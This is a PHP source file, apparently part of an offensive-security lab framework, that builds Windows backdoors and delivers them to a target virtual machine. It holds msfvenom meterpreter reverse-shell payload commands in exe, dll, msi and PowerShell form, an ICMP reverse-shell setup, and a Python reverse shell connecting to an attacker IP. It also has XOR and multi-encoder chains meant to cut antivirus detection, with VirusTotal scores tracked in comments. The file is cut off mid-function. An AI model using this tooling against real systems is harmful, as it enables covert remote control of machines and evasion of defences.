<?php 




class backdoor4win extends malware4win{

  

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
    }
    
    
    
    
    
    
    public function backdoor_win_icmp() {
        $this->ssTitre(__FUNCTION__);
        $victime = new VM($this->target_vmx_name); // xp3
        $this->requette("cp -v $this->dir_tools/Malware/icmp/icmpsh_m.py $this->dir_tmp/icmpsh_m.py");
        $this->requette("cp -v $this->dir_tools/Malware/icmp/icmpsh.exe $this->dir_tmp/icmpsh.exe");
        $this->ssTitre("Disable ping replies or drop ICMP packets of type 0 (echo reply) on Linux.");
        // echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
        $this->requette("sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1");
        $this->ssTitre("enforce the setting immediately");
        $this->requette("sudo sysctl -p");
        
        $victime->vm2upload("$this->dir_tools/Malware/icmp/icmpsh.exe","$this->vm_tmp_win/icmpsh.exe");
        $this->cmd($this->target_ip, "$this->vm_tmp_win/icmpsh.exe -t $this->attacker_ip -d 500 -b 30 -s 128" );
        $this->pause();
        $this->file_file2virus2vt();
        $this->win2info();
        $this->pause();
        $this->cmd($this->attacker_ip,"python $this->dir_tmp/icmpsh_m.py $this->attacker_ip $this->target_ip");
        $this->pause();
    }
    
    public function backdoor_win_bat2exe() {
        $this->ssTitre(__FUNCTION__);
        $this->net("http://bat2exe.net/" );
        $this->net("http://sourceforge.net/projects/bat-to-exe/files/latest/download" );
        $this->net("https://github.com/gitpan/Alien-BatToExeConverter" );
        
        
    }
    
    public function backdoor_win_pdf2exe() {
        $this->ssTitre(__FUNCTION__);
        $this->net("http://www.pdf2exe.com/pdf2exe.html" );
        $this->net("http://vaysoft-pdf-to-exe-converter.software.informer.com/download/" );
        $this->net("http://www.softpedia.com/get/PORTABLE-SOFTWARE/Office/Calendar-Organizers/PDF/Windows-Portable-Applications-Portable-PDF2EXE.shtml" );
        
        
    }
    
    
    
    
    public function backdoor_win_jar2exe() {
        $this->ssTitre(__FUNCTION__);
        $file_jar_name = str_replace(".jar", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $vmx->vm2upload("$this->dir_install/Win/Exec/JAVA/j2e_x86.msi", "$this->vm_tmp_win\\j2e_x86.msi");
        $this->note("coche encrypt and hide class" );
        $this->cmd($this->target_ip, "launch $this->vm_tmp_win\\j2e_x86.msi" );
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_jar_name", "$this->file_dir/$file_jar_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_jar_name" );
        $check = new bin4win("$this->file_dir/$file_jar_name");	
        $check->file_file2virus2vt();
        //$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();

        return $this;
    }
    
    public function backdoor_win_perl2exe() {
        $this->ssTitre(__FUNCTION__);
        $file_source_name = str_replace(".pl", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        
        $this->cmd($this->target_ip,"perl -MCPAN -e 'install PAR::Packer'");
        $this->note("OR");
        $this->cmd($this->target_ip,"cpan pp");
        $this->cmd($this->target_ip,"pp $this->vm_tmp_win\\$this->file_ext -o $this->vm_tmp_win\\$file_source_name");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();
        //$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    
    public function backdoor_win_php2exe_convert4bamcompile() {
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre("php2exe PHP convert into binary for Windows OS" ); // OK
        $php_file_name = str_replace(".php", "_php2exe4bamcompile.exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        

        $vmx->vm2upload("$this->dir_install/Win/backdoor/PHP/bamcompile1.21/bamcompile.exe", "$this->vm_tmp_win\\bamcompile.exe");
        $vmx->vm2upload("$this->dir_install/Win/backdoor/PHP/bamcompile1.21/evil.ico", "$this->vm_tmp_win\\evil.ico");
        $vmx->vm2upload("$this->file_path", "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd("$this->target_ip","$this->vm_tmp_win\\bamcompile.exe -w $this->vm_tmp_win\\$this->file_ext -i:$this->vm_tmp_win\\evil.ico -c -o $this->vm_tmp_win\\$php_file_name" );
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$php_file_name", "$this->file_dir/$php_file_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$php_file_name" );
        $check = new bin4win("$this->file_dir/$php_file_name");
        $check->file_file2virus2vt();
        //$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    public function backdoor_win_py2exe_script() {
        $this->ssTitre(__FUNCTION__);
        $python_file_name = str_replace(".py", "", $this->file_ext );
        $add = "from cx_Freeze import setup, Executable
	# On appelle la fonction setup
setup(
name = \"$python_file_name\",
version = \"1\",
description = \"Votre programme\",
executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")],
)";
        $this->requette("echo '$add' > $this->file_dir/$this->file_name.cxfreeze.py ");
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        
        $vmx->vm2upload("$this->dir_img/evil.ico", "$this->vm_tmp_win\\evil.ico");
        $vmx->vm2upload("$this->file_dir/$this->file_name.cxfreeze.py", "$this->vm_tmp_win\\$this->file_name.cxfreeze.py");
        $this->cmd($this->target_ip,"cxfreeze '$this->vm_tmp_win\\$this->file_name.cxfreeze.py' --target-name=$this->file_name.exe --icon=$this->vm_tmp_win\\evil.ico --target-dir=$this->vm_tmp_win\\backdoor_win32 ");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.exe", "$this->file_dir/$this->file_name.exe");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$this->file_name.exe" );
        $check = new bin4win("$this->file_dir/$this->file_name.exe");
        $check->file_file2virus2vt();
        //$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    public function backdoor_win_py2exe4veil() {
        $this->ssTitre(__FUNCTION__);
        $file_source_name = str_replace(".py", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->attacker_ip, "cd /opt/Veil-Evasion-master/; python Veil-Evasion.py" );
        $this->ssTitre("using Veil Framework tools - PyInstaller" ); // generer des fichiers exe apartir de .py
        $this->article("Test", "use (3x1,22x3x3,34x1) -> backdoor_windows_veil_22_1.exe" );
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    public function backdoor_win_py2exe4py2exe() {
        /*
         from distutils.core import setup
         import py2exe
         
         setup(scripts=[r"c:\documents and settings\xpsp3\bureau\backdoor_com_python_netcat.py"],)
         */
        // net("http://www.py2exe.org/");
        // net("http://sourceforge.net/projects/py2exe/files/latest/download");
        $this->ssTitre(__FUNCTION__);
        $file_source_name = str_replace(".py", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip,"pip install py2exe");
        $this->cmd($this->target_ip,"py2exe $this->vm_tmp_win\\$this->file_ext -o $this->vm_tmp_win\\$file_source_name");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    public function backdoor_win_py2exe4pyinstaller() {
        $this->ssTitre(__FUNCTION__);
        $file_source_name = str_replace(".py", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip,"python -m pip install -U pyinstaller");
        $this->note("OR");
        $this->cmd($this->target_ip,"pip install pyinstaller");
        $this->cmd($this->target_ip,"pyinstaller --onefile --icon=$this->vm_tmp_win\\\\evil.ico $this->vm_tmp_win\\\\$this->file_ext --distpath=$this->vm_tmp_win --name $this->vm_tmp_win\\\\$file_source_name");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    
    public function backdoor_win_py2exe4pwnstaller() {
        $this->ssTitre(__FUNCTION__);
        // https://github.com/intfrr/Pwnstaller.git
        $file_source_name = str_replace(".py", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip,"pip install pwnstaller");
        $this->cmd($this->target_ip,"pwnstaller $this->vm_tmp_win\\$this->file_ext -o $this->vm_tmp_win\\$file_source_name");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    
    public function backdoor_win_py2exe() {
        $this->ssTitre(__FUNCTION__);
        // pip install python-script-converter
        
        // net("http://sourceforge.net/projects/pywin32/");
        // net("https://github.com/jkess/py2exe_singlefile");
        // net("https://github.com/Guemi/Setup.py");
        //$this->backdoor_win_py2exe4py2exe();
        $this->backdoor_win_py2exe4pyinstaller();
        //$this->backdoor_win_py2exe4pwnstaller();
        //$this->backdoor_win_py2exe4veil();
        //$this->backdoor_win_py2exe_script();
    }
    
    
    
    public function backdoor_win_c2exe() {
        $this->ssTitre(__FUNCTION__);
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $this->requette("/usr/bin/i686-w64-mingw32-gcc -Os -m32 -c $this->dir_tools/backdoor/backdoor_win32.c -o $this->file_dir/$this->file_name.o" );
        $this->requette("/usr/bin/i686-w64-mingw32-ld $this->file_dir/$this->file_name.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -subsystem=windows -o $this->file_path" );
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->requette("gedit $this->dir_tools/backdoor/backdoor_win32.c");
        $vmx->vm2upload("$this->file_path", "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip,"$this->vm_tmp_win\\$this->file_ext" );
        $this->cmd($this->attacker_ip,"nc $this->target_ip $this->attacker_port -v" );
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$this->file_ext", "$this->file_path");
        $this->file_file2virus2vt(); // 16/54
        $this->win2info();
        $this->pause();
        //$this->file_file2sandbox("cuckoo1");
        $this->note("Pour Options pour le backdoor = + de detection pour les antivirus");
        return $this;
    }
    
    
    
    
    function backdoor_win_msf2c2rev() {
        $this->ssTitre("SHELLCODE C");
        /*
         cmd/windows/powershell_reverse_tcp         // 06/56
         windows/powershell_reverse_tcp             // 08/56
         windows/meterpreter/reverse_tcp --arch x86 // 09/56
         windows/shell_reverse_tcp  --arch x86      // 09/56
         cmd/windows/reverse_powershell
         */
         
       
       $this->requette("msfvenom --payload windows/shell_reverse_tcp RHOST=$this->attacker_ip RPORT=$this->attacker_port --platform windows --arch x86 --encoder x86/shikata_ga_nai --iterations 1 --format c > $this->file_dir/$this->file_name.h ");
        $this->requette("sudo chown $this->user2local:$this->user2local $this->file_dir/$this->file_name.h");
        $this->requette("cat $this->file_dir/$this->file_name.h");
       
        $check = file_get_contents("$this->file_dir/$this->file_name.h");
        if (empty($check )) {
            $this->important("Echec msfvenom C Retry in 3 secondes");
            sleep(3 );
            return $this->backdoor_win_msf2c2rev();
        }
        $vmx = new VM($this->target_vmx_name); // xp3
        $file_h = new file("$this->file_dir/$this->file_name.h") ;
        $file_hex = $file_h->file_h2hex();
        $file_c = $file_hex->file_shellcode2c();
        //$file_c_pe = $file_c->file_c2pe();
        //$file_pe_c = $file_c->file_c2pe();
        $vmx->vm2upload($file_c->file_path, "$this->vm_tmp_win\\$file_c->file_ext");
        $this->cmd($this->target_ip,"compile under Dec CPP  $this->vm_tmp_win\\$file_c->file_ext");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_c->file_name.exe", $this->file_path);
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path");
        $this->file_file2virus2vt(); // 7/56
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        
        $this->cmd("localhost","nc -l -p $this->attacker_port -v -n ");
        $this->pause();
        return $this;
    }
    
    
    
    
    public function backdoor_win_python_simple() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->prof, "nc -l -p $this->attacker_port -v " );
        $this->cmd($this->prof, "python $this->file_path" );
        $code =<<<CODE
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("$this->prof",$this->attacker_port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["cmd","-i"]);
CODE;
        
        $this->requette("echo '$code' > $this->file_path" );
        $this->file_file2virus2vt(); // 0 / 57
        return $this;
    }
    
    public function backdoor_win_av4proof(){
        $this->ssTitre(__FUNCTION__);
        $vmx = new VM($this->target_vmx_name); // xp3
        $payload = "windows/meterpreter/reverse_tcp";
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD $payload ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $this->pause();
        $query = "msfvenom --payload $payload --arch x86 LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format c > $this->file_dir/$this->file_name.h";
        if(!file_exists("$this->file_dir/$this->file_name.h")) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_dir/$this->file_name.h " );} else $this->cmd($this->attacker_ip,$query);
        $this->requette("cat $this->file_dir/$this->file_name.h");
        
        $header_c = file_get_contents("$this->file_dir/$this->file_name.h");
        $code1 =<<<CODE
	void main(){
	(*(void(*)()) buf)();
}
CODE;
       
        $this->requette("cat $this->file_dir/$this->file_name.h >  $this->file_dir/$this->file_name.1.c");
        $this->requette("echo '$code1' >> $this->file_dir/$this->file_name.1.c");
        $vmx->vm2upload("$this->file_dir/$this->file_name.1.c", "$this->vm_tmp_win\\$this->file_name.1.c");
        $this->cmd($this->target_ip,"compile $this->vm_tmp_win\\$this->file_name.1.c");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.1.exe", "$this->file_dir/$this->file_name.1.exe");
        $check = new bin4win("$this->file_dir/$this->file_name.1.exe");
        $check->file_file2virus2vt(); // 17 / 67
        $check->win2info();
        $this->pause();
        
        //$check->file_file2sandbox("cuckoo1");
        $this->pause();
        
        
        
        $code2 =<<<CODE
void main(){
	int i;
	FILE *header ;
	
	header=fopen("$this->file_dir/$this->file_name.2.h", "w");
	if(header == NULL) {
      	printf("Error!");
      	exit(1);
   	}
	else printf("Succes created $this->file_dir/$this->file_name.2.h ");
	fprintf(header,"unsigned char buf[] =\"");
	for(i=0;i<sizeof buf;i++){
	buf[i]=buf[i]^0xfe;	// 0xff
	fprintf(header,"\\\\\\x%02x",buf[i]);
	}
	fprintf(header,"\";");
	fclose(header);
}
CODE;
        $this->note("byte = 256, 0xff = 255, 0xff = 255-256=-1=255");
        
        $this->requette("echo '#include <stdio.h>' > $this->file_dir/$this->file_name.2.c");
        $this->requette("cat $this->file_dir/$this->file_name.h >>  $this->file_dir/$this->file_name.2.c");
        $this->requette("echo '$code2' >> $this->file_dir/$this->file_name.2.c");
        $this->requette("gcc -w $this->file_dir/$this->file_name.2.c -o $this->file_dir/$this->file_name.2.elf ");
        $this->requette("$this->file_dir/$this->file_name.2.elf ");
        $this->requette("cat $this->file_dir/$this->file_name.2.h");
        $this->pause();
        
        
        
        
        $code3 =<<<CODE
        
int main(int argc, char **argv){
	int i;
	unsigned int j;
	j=atoi(argv[1]);
	for(i=0;i<sizeof buf;i++){
	buf[i]=buf[i]^j;
	}
	(*(void(*)()) buf)();
}
CODE;
        $this->requette("cat $this->file_dir/$this->file_name.2.h >  $this->file_dir/$this->file_name.3.c");
        $this->requette("echo '$code3' >> $this->file_dir/$this->file_name.3.c");
        $vmx->vm2upload("$this->file_dir/$this->file_name.3.c", "$this->vm_tmp_win\\$this->file_name.3.c");
        $this->cmd($this->target_ip,"compile $this->vm_tmp_win\\$this->file_name.3.c");
        $this->cmd($this->target_ip,"$this->vm_tmp_win\\$this->file_name.3.exe -2");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.3.exe", "$this->file_dir/$this->file_name.3.exe");
        $check = new bin4win("$this->file_dir/$this->file_name.3.exe");
        $check->file_file2virus2vt(); // 03 / 67
        //$check->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        
        
        
        
        
        
    }
    
    
    
    
    
    
    public function backdoor_win_msf2exe_https() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_https LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format exe -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->file_file2virus2vt(); // 44 / 57
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    
    
    
    public function backdoor_win_ruby2exe() {
        $this->ssTitre(__FUNCTION__);
        $file_source_name = str_replace(".rb", ".exe", $this->file_ext );
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        $vmx->vm2upload("$this->dir_img/evil.ico", "$this->vm_tmp_win\\evil.ico");
        $this->cmd($this->target_ip,"gem install ocra");
        $this->cmd($this->target_ip,"run terminal as administrator ");
        $this->cmd($this->target_ip,"ocra $this->vm_tmp_win\\$this->file_ext --icon $this->vm_tmp_win\\evil.ico --output $this->vm_tmp_win\\$file_source_name --console --verbose");
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
        $check = new bin4win("$this->file_dir/$file_source_name");
        $check->file_file2virus2vt();//$this->file_file2sandbox("cuckoo1");
        $check->win2info();
        $this->pause();
        return $this;
    }
    
    
    public function backdoor_win_ps1() {
        $this->ssTitre(__FUNCTION__); // ok
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format psh -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        $this->win2info();
        $this->pause();
        $this->cmd($this->attacker_ip, "powershell $this->vm_tmp_win\\$this->file_ext " );
        $vmx = new VM($this->target_vmx_name); // xp3
        //$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2dll() {
        $this->ssTitre(__FUNCTION__); // ok
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format dll -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt(); // 44 / 57
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        $this->pause();
        $this->cmd($this->attacker_ip, "rundll32 $this->vm_tmp_win\\$this->file_ext start" );
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2msi() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload windows/meterpreter/reverse_https LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format msi -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
       // $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->file_file2virus2vt(); // 44 / 57
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2exe_encoded_10() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $file_output1 = "$this->file_dir/".__FUNCTION__.".raw";
        $this->ssTitre("Creation de backdoor TCP avec MSF MODE Reverse pour cible Windows" ); // ok
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw -o $file_output1";
        if (! file_exists($file_output1)) {$this->requette($query);}
        else $this->cmd($this->attacker_ip,$query);
        $display = new file($file_output1);
        $display->file_file2info();
       
       $display->dot2png($display->file_raw2graph());
       
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format exe -o $this->file_path";
        if (! file_exists($this->file_path )) {
            $this->requette($query);
            $this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );
        }
        else $this->cmd($this->attacker_ip,$query);
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->file_file2virus2vt(); // 44 / 57
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2exe_encoded_multi() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $file_output1 = "$this->file_dir/".__FUNCTION__.".raw";
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform windows --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw -o $file_output1";
        if (! file_exists($file_output1)) {$this->requette($query);}
        else $this->cmd($this->attacker_ip,$query);
        $display = new file($file_output1);$display->file_file2info();$display->file_raw2graph();
        $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform windows --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format exe -o $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->file_file2virus2vt(); // 44 / 57
        //$this->file_file2sandbox("cuckoo1");
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
    public function backdoor_win_msf2perl2php() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload  php/reverse_perl LHOST='$this->attacker_ip' LPORT=$this->attacker_port R | tee $this->file_path";
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
        $this->file_file2virus2vt();
        $this->win2info();
        $this->pause();
        $vmx = new VM($this->target_vmx_name); // xp3
        $vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
        return $this;
    }
    
/*    // to delete later 
    public function backdoor_win_msf2ruby() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload ruby/shell_reverse_tcp LHOST='$this->attacker_ip' LPORT=$this->attacker_port --platform ruby --format raw | tee $this->file_path" ;
        if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
        else $this->cmd($this->attacker_ip,$query);
